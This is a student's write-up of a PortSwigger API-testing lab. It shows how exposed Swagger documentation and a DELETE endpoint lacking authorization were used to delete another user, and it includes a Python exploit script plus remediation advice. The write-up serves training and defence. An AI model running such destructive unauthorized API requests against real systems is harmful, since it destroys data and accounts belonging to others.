# Lab 1 – Exploiting an API Endpoint Using Documentation

**Lab URL:** https://0a58008903c7b9ca812f394b004a0016.web-security-academy.net/  
**Student:** Jarren Calizo  
**Course:** CS 595: Web and Cloud Security (Professor Wu-Chang Feng)  
**Term:** Spring 2025  
**Lab Theme:** PortSwigger API Testing  
**Lab Type:** API9 - Improper Inventory Management, API1 - Broken Object Level Authorization (BOLA)

---

## ✅ Objective

The goal of this lab was to discover publicly exposed API documentation, understand its structure, and use the interactive interface to exploit a destructive endpoint. The final step required deleting another user (`carlos`) from the system.

---

## 🔍 Vulnerability Summary

- The API exposed its interactive documentation (likely Swagger UI) at `/api/`.
- From there, unauthenticated users could access and execute destructive methods (like `DELETE`) through the browser or code.
- This is a form of **improper inventory management** and **missing access controls**, violating principles of least privilege.

---

## 🧪 Exploitation Walkthrough

1. **Login**  
   Navigated to the lab URL and logged in as `wiener:peter`.

2. **Recon API Request**  
   Performed a frontend action (email update) and inspected the network request:  
   `PATCH /api/user/wiener` revealed API patterns.

3. **API Enumeration**  
   Manually visited `/api/user`, then `/api/` in the browser.  
   The path `/api/` returned full interactive Swagger-based documentation.

4. **Using the API Docs**  
   In the interactive panel, I selected the `DELETE /api/user/{username}` endpoint, input `carlos`, and executed the request.

5. ✅ **Carlos was deleted**, successfully solving the lab.

---

## 🐍 Exploit Script (exploit.py)

```python
import requests
from bs4 import BeautifulSoup

LAB_ID = "0a58008903c7b9ca812f394b004a0016"
BASE_URL = f"https://{LAB_ID}.web-security-academy.net"

# Start session
session = requests.Session()

# Load login page and extract CSRF token if present
login_page = session.get(BASE_URL + "/login")
soup = BeautifulSoup(login_page.text, 'html.parser')
csrf_input = soup.find("input", {"name": "csrf"})
csrf_token = csrf_input['value'] if csrf_input else None

# Login credentials
login_data = {
    "username": "wiener",
    "password": "peter"
}
if csrf_token:
    login_data["csrf"] = csrf_token

# Perform login
login_resp = session.post(BASE_URL + "/login", data=login_data)
assert "My account" in login_resp.text or login_resp.status_code == 302, "Login failed."

# Perform API exploit
delete_resp = session.delete(BASE_URL + "/api/user/carlos")

if delete_resp.status_code == 200:
    print("[+] Carlos deleted successfully!")
else:
    print(f"[-] Failed to delete Carlos. Status: {delete_resp.status_code}")
```

---

## 🧪 Validation Strategy

- **Lab Success Criteria:** The lab is marked as solved when the `DELETE /api/user` endpoint successfully deletes the `carlos` user.
- **Confirmation Method:** After interacting with the Swagger-style API documentation interface and sending the DELETE request for `carlos`, the lab page updates with a "Congratulations, you solved the lab!" banner.
- **Diagnostic Clues:**
  - If the API documentation interface is not found, backtrack by trimming API path segments in Burp Repeater (`/api/user/wiener` → `/api/user` → `/api`) to probe for API discovery.
  - Sending malformed requests (e.g., DELETE with a nonexistent user) results in appropriate error feedback from the API, confirming it's interactive and exploitable.

---

## 🔐 Remediation Strategy

To prevent this type of vulnerability:

- **Restrict documentation access**  
  Only expose tools like Swagger or OpenAPI to internal or authenticated users with proper roles.

- **Apply proper authorization checks**  
  Every endpoint, especially `DELETE`, must verify the current user's permissions.

- **Avoid broad endpoint access**  
  Use API gateways, route scoping, and allowlists to restrict which users see or use which routes.

- **Harden production environments**  
  Remove testing or dev tools before deploying to production.

- **Log and monitor**  
  Alert on unexpected documentation access or destructive requests.

---

## 💡 Key Lessons Learned

- API documentation, while helpful for devs, can **dramatically widen the attack surface** if misconfigured.
- Manual enumeration and endpoint testing (even without Burp) can uncover serious flaws.
- Leveraging the documentation's built-in UI is enough to simulate a real attack.
